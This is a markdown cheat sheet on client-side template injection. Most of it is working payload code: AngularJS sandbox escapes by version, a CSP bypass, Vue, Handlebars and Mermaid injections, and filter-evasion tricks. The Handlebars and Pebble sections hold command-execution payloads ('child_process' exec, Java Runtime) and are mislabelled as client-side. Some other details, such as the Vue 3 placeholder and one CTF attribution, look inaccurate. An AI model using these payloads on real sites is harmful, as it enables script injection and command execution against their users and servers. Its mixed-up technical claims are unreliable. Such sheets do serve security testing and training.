# CSTI — Client-Side Template Injection

## CSTI vs SSTI

| | CSTI | SSTI |
|-|------|------|
| Execution | Browser (JavaScript) | Server (Python/Java/PHP) |
| Result | XSS (DOM context) | RCE / file read |
| Engine | AngularJS, Vue.js, Handlebars | Jinja2, Twig, EJS, Thymeleaf |
| Detection | `{{7*7}}` reflected in DOM as `49` | `{{7*7}}` in HTTP response |

---

## Detection

Inject into any user-controlled field that gets rendered in the DOM:

```
{{7*7}}
${7*7}
#{7*7}
*{7*7}
```

Check rendered HTML source — if you see `49` instead of `{{7*7}}` → CSTI.

---

## AngularJS

### Versions with sandbox (< 1.6)

AngularJS had an "expression sandbox" to prevent arbitrary JS. Bypasses:

#### Version 1.0.x - 1.1.x
```javascript
{{constructor.constructor('alert(1)')()}}
```

#### Version 1.2.x
```javascript
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
```

#### Version 1.3.x
```javascript
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
'a'.constructor.prototype.charAt=''.valueOf;
$eval('x=alert(1)//');}}
```

#### Version 1.4.x
```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

#### Version 1.5.x
```javascript
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

#### Version 1.6+ (sandbox removed — direct XSS)
```javascript
{{constructor.constructor('alert(1)')()}}
$eval('alert(1)')
```

### AngularJS via ng-app attribute injection
If you can inject HTML attributes:
```html
<div ng-app ng-csp>{{$on.constructor('alert(1)')()}}</div>
```

### AngularJS CSP bypass (no unsafe-eval)
```javascript
<!-- Requires AngularJS + whitelist-able src -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js"></script>
<div ng-app ng-csp>
  <input ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">
</div>
```

---

## Vue.js

### Vue 2.x
```javascript
// In template context
{{_c.constructor`alert(1)`()}}
{{constructor.constructor('alert(1)')()}}

// Via v-html (rendered as HTML)
// Find where app uses v-html with user input
```

### Vue 3.x
Vue 3 is significantly harder — expressions are compiled at build time.
If SSR (server-side rendering) with user input:
```javascript
// Check for dangerouslySetInnerHTML equivalent
```

---

## Handlebars (client-side)

```javascript
// In template string
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## Pebble (Java — client-side rendering)

```
{% set cmd = 'id' %}
{% set bytes = "test".getClass().forName('java.lang.Runtime').getMethods()[6].invoke('test'.getClass().forName('java.lang.Runtime').getMethods()[5].invoke(null),cmd.split(' ')) %}
```

---

## Mermaid / Markdown renderers

Some apps render Mermaid diagrams or markdown with template features:
```
graph TD
  A-->|{{constructor.constructor('alert(1)')()}}|B
```

---

## Quick Identification Flow

```
1. Find any reflected input in the browser DOM
2. Inject: {{7*7}} ${7*7} #{7*7}
3. View page source (not DevTools) — check raw HTML
4. If 49 appears → CSTI
5. Identify framework:
   - ng-* attributes → AngularJS
   - v-* attributes / Vue app div → Vue.js
   - {{> or {{# → Handlebars
6. Apply framework-specific payload above
```

---

## Bypass Filters

```javascript
// When {{ is blocked
// AngularJS alternative delimiters (configurable by app)
[[7*7]]
<%7*7%>

// Unicode bypass
\u007b\u007b7*7\u007d\u007d

// JS comment insertion
{/**/{ 7*7 }/**/}
```

---

## Real CTF Examples

- **ASIS CTF 2019**: AngularJS 1.5 sandbox escape → XSS
- **HackTheBox - BountyHunter** (web variant): Handlebars CSTI
- **Google CTF 2018 - Translate**: AngularJS CSP bypass via ng-focus

---

## References

- [AngularJS Sandbox Escapes — portswigger.net](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection)
- [Client-Side Template Injection — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#client-side-template-injection)
